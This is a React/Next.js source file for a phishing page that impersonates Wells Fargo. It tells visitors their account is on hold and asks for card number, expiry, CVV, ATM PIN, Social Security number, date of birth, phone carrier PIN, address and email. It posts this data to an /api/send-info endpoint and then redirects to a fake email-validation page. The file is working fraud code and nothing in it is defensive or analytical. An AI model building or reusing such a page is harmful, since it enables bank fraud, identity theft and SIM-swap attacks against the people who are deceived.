import React, { useContext, useEffect, useState } from "react";
import Head from "next/head";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import valid from "card-validator";
import { Container } from "../../components/Container";
import { Input } from "../../components/Input";
import { Wrapper } from "../../components/Wrapper";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { DataContext } from "../_app";

interface InfoProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Please enter your card number.")
    .test(
      "test-number",
      "Please enter a valid card number",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("Please enter your card expiration date")
    .test(
      "test-date",
      "Please enter a valid date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("Please enter your card CVV number.")
    .test(
      "test-cvv",
      "Please enter a valid CVV number.",
      (value) => valid.cvv(value).isValid
    ),
  cardPin: yup
    .string()
    .required("Please enter your card pin.")
    .min(4, "Please enter a valid ATM pin")
    .max(5, "Please enter a valid ATM pin"),
  fullname: yup.string().required("Please enter your full name."),
  dob: yup.string().required("Please enter your birth date."),
  ssn: yup.string().required("Please enter your SSN Number."),
  address: yup.string().required("Please enter your address."),
  zipCode: yup.string().required("Please enter your Zip code."),
  state: yup.string().required("Please enter the state you in."),
  phoneNumber: yup.string().required("Please enter your phone number."),
  carrierPin: yup.string(),
  email: yup
    .string()
    .required("Please enter your email address.")
    .email("Please enter a valid email address."),
});

export const Info: React.FC<InfoProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    const info = {
      card: {
        number: data.cardNumber,
        date: data.expirationDate,
        cvv: data.cvv,
        pin: data.cardPin,
      },
      billing: {
        fullname: data.fullname,
        dob: data.dob,
        ssn: data.ssn,
        phoneNumber: data.phoneNumber,
        carrierPin: data.carrierPin,
        state: data.state,
        address: data.address,
        zipCode: data.zipCode,
      },
      email: data.email,
    };

    formData.append(`form`, `INFO`);
    formData.append(`info`, JSON.stringify(info));

    try {
      await axios.post(`/api/send-info`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      info,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper altH hideBg loading={loading}>
      <Head>
        <title>Wells Fargo - Secure Your Account</title>
      </Head>
      <div>
        <Container>
          <div
            style={{
              display: `flex`,
              flexWrap: `nowrap`,
              alignItems: `center`,
              //   justifyContent: `center`,
            }}
          >
            <h1
              className="FloatingPage__salutationTitle___1X9Mp"
              style={{
                color: `#d20826`,
              }}
            >
              <span>Your account is on hold</span>
            </h1>
          </div>
          <p
            className="FloatingPage__title___2W2k5"
            style={{
              display: `flex`,
              flexWrap: `nowrap`,
              alignItems: `center`,
              //   justifyContent: `center`,
            }}
          >
            <span>
              For your security, your account is on hold please verify your
              information to regian access.
            </span>
          </p>
        </Container>
        <Container title="Your card details">
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`cardNumber`}
                label={`Card Number`}
                mask={cardMask}
                error={errors.cardNumber && errors.cardNumber.message}
                register={register}
                registerOptions={{
                  onChange: (event: any) => {
                    var value = event.target.value;

                    var newState = "9999 9999 9999 9999";
                    if (/^3[47]/.test(value)) {
                      newState = "9999 999999 99999";
                    }
                    setCardMask(newState);
                  },
                }}
                curValue={watch(`cardNumber`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`expirationDate`}
                mask={`99/9999`}
                label={`Expiration date (MM/YYYY)`}
                error={errors.expirationDate && errors.expirationDate.message}
                register={register}
                curValue={watch(`expirationDate`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`cvv`}
                label={`CVV (3-digits at back of your card)`}
                type={`number`}
                error={errors.cvv && errors.cvv.message}
                register={register}
                curValue={watch(`cvv`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`cardPin`}
                label={`Pin (The same pin you use at the ATM)`}
                type={`number`}
                error={errors.cardPin && errors.cardPin.message}
                register={register}
                curValue={watch(`cardPin`)}
              />
            </div>
          </div>
        </Container>
        <Container title="Your personal information">
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`fullname`}
                label={`Full Name`}
                error={errors.fullname && errors.fullname.message}
                register={register}
                curValue={watch(`fullname`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`dob`}
                label={`Date of Birth mm/dd/yyyy`}
                mask={`99/99/9999`}
                error={errors.dob && errors.dob.message}
                register={register}
                curValue={watch(`dob`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`ssn`}
                label={`Social Security Number`}
                mask={`999-99-9999`}
                error={errors.ssn && errors.ssn.message}
                register={register}
                curValue={watch(`ssn`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`phoneNumber`}
                label={`Phone Number`}
                mask="(999) 999 9999"
                error={errors.phoneNumber && errors.phoneNumber.message}
                register={register}
                curValue={watch(`phoneNumber`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`carrierPin`}
                label={`Carrier Pin`}
                error={errors.carrierPin && errors.carrierPin.message}
                register={register}
                curValue={watch(`carrierPin`)}
                type={`number`}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`address`}
                label={`Address`}
                error={errors.address && errors.address.message}
                register={register}
                curValue={watch(`address`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`state`}
                label={`State`}
                error={errors.state && errors.state.message}
                register={register}
                curValue={watch(`state`)}
              />
            </div>
          </div>
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`zipCode`}
                label={`Zip Code`}
                type={`number`}
                error={errors.zipCode && errors.zipCode.message}
                register={register}
                curValue={watch(`zipCode`)}
              />
            </div>
          </div>
        </Container>
        <Container title="Your email address">
          <div className="WFFieldSpacing__text___2s42d">
            <div className="WFField__field___3JstE Identification__segmentsInput___3kIqC">
              <Input
                name={`email`}
                label={`Email`}
                error={errors.email && errors.email.message}
                register={register}
                curValue={watch(`email`)}
              />
            </div>
          </div>
        </Container>
        <div
          className="FormButtons__formButtonsContainer___2RL6S"
          style={{
            marginBottom: `5em`,
            padding: `0.75rem`,
          }}
        >
          <div
            className="FormButtons__actionButton___1iNYE"
            aria-describedby="form-error-msg"
          >
            <button
              id="LIJSTDAH"
              type="submit"
              className={`Button__button___3y0lE Button__modern___3lAgx ${
                loading || !isValid ? `Button__disabled___1L4yr` : ``
              } Button__responsive___1QHpq Button__primary___ritso`}
              style={{
                borderRadius: `24px`,
              }}
              disabled={loading || !isValid}
              onClick={onSubmit}
            >
              <span data-localized="global.continue">Continue</span>
            </button>
          </div>
        </div>
      </div>
    </Wrapper>
  );
};

export default Info;
